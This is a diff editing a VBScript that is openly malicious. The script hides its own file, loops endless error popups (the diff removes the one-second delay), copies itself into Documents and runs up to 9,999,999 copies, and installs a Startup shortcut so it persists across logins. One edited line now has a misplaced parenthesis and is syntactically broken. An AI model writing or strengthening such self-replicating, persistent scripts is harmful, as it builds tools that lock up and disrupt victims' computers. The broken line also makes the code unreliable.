@@ -17,7 +17,9 @@ For Each objFile In objFolder.Files
 Next
 
 ' Hide the original script
-objFSO.GetFile(WScript.ScriptFullName).Attributes = objFSO.GetFile(WScript.ScriptFullName).Attributes Or 2 ' Hidden
+Dim strScriptPath
+strScriptPath = WScript.ScriptFullName
+objFSO.GetFile(strScriptPath).Attributes = objFSO.GetFile(strScriptPath).Attributes Or 2 ' Hidden
 
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
@@ -43,7 +45,7 @@ Do While True
     objShell.Popup "Goodbye", 0, "Error", &H10
 
     ' Wait for one second before repeating the loop
-    WScript.Sleep 1000
+    WScript.Sleep 0
 Loop
 
 Set WshShell = WScript.CreateObject("WScript.Shell")
@@ -59,13 +61,13 @@ objShellLink.Save
 ' Copy script to Documents folder
 strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
 For i = 1 to 9999999
-    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs", True
-    WshShell.Run chr(34) & strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs" & chr(34), 0, False
+    fso.CopyFile strScriptPath, strDocumentsPath & "\" & fso.GetFileName(strScriptPath) & i & ".vbs", True
+    WshShell.Run chr(34) & strDocumentsPath & "\" & fso.GetFileName(strScriptPath& i & ".vbs" & chr(34), 0, False
 Next
 
 ' Create a shortcut in the Startup folder to run the script when the user logs in
 strStartupPath = WshShell.SpecialFolders("Startup")
 Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\ScriptLauncher.lnk")
 objShellLink.TargetPath = "wscript.exe"
-objShellLink.Arguments = """" & WScript.ScriptFullName & """"
+objShellLink.Arguments = """" & strScriptPath & """"
 objShellLink.Save
